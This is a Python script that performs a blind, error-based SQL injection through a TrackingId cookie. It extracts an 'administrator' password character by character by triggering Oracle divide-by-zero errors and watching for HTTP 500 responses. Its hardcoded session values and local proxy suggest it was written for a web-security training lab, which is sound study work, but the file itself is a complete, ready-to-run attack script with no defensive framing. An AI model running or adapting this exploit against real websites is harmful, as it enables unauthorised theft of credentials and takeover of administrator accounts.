import sys 
import requests
import urllib3
import urllib.parse  # Added import for urllib.parse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}

def sqli_password(url):
    password_extracted = ""
    # here first we have to find the number of characters in the password, which is 20
    
    for i in range(1, 21):
        for j in range(40, 126):
        
        #The f before a string literal in Python denotes an f-string, which is a formatted string literal. It allows you to embed expressions inside curly braces {} within the string, where each expression is evaluated at runtime and formatted into the string
        
             sqli_payload= f"' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and substr(password, {i}, 1) = '{chr(j)}') || '"
             #sqli_payload="' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and substr(password, %s,1) ='%s') ||'" %(i,j)
             
             sqli_payload_encoded = urllib.parse.quote(sqli_payload)
             cookies = {'TrackingId': 'uqcOPt1v4N3ogVHu' + sqli_payload_encoded, 'session': 'FDheSfoxpIBHX9ELQGUNgMi4kYczpH2O'}
             r = requests.get(url, cookies=cookies, verify=False,proxies=proxies)
             if r.status_code == 500:
                 
                 password_extracted += chr(j)
                 sys.stdout.write('\r' + password_extracted)
                 sys.stdout.flush()
                 break
             else:
                 
                 sys.stdout.write('\r' + password_extracted + chr(j))
                 sys.stdout.flush()
            
def main():
    if len(sys.argv) != 2:
        print("(+) Usage : %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print("(+) Retrieving administrator password....")
    sqli_password(url)

if __name__ == "__main__":  # Corrected the condition for main execution
    main()
